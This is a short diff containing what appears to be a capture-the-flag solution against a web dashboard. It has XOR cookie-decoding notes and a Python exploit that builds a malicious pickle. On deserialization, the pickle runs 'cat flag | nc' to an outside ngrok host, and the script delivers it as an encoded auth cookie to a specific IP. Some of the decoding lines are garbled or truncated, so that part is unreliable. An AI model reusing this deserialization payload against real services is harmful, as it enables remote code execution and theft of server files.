@@ -1,0 +1,31 @@
+from pwn import xor
+bytes.fromhex('AUTHCOKIE')
+b'y...
+key = 'KEY'
+>>>xor(_,key)
+b"(dp0...
+>>>b =b"(dp0...
+>>>xor(b,key)
+b'ys5\....'
+>>>b'ys5\....'.hex()
+'ნეწაუტჰცოოკიე'
+
+Cookie: auth_cookie=6f363377501260372841272d3437242a596d44400745026e40302f45693849655c3270; key=GRCGZAGGM3JDGDME7JN06OQI5CJ7N29WVAT
+
+import requests
+import pickle
+from pwn import *
+url = "http://35.198.93.134:30049/dashboard"
+class RCE:
+def __reduce__(self):
+cmd = ('cat flag | nc 2.tcp.ngrok.io 17855')
+return os.system, (cmd,)
+payload = pickle.dumps(RCE(), protocol=2)
+print(payload)
+key = len(payload) * "A"
+auth_cookie = xor(payload, key).hex()
+r = requests.get(url, cookies={"key": key, "auth_cookie": auth_cookie})
+
+python3 filename.py
+
+
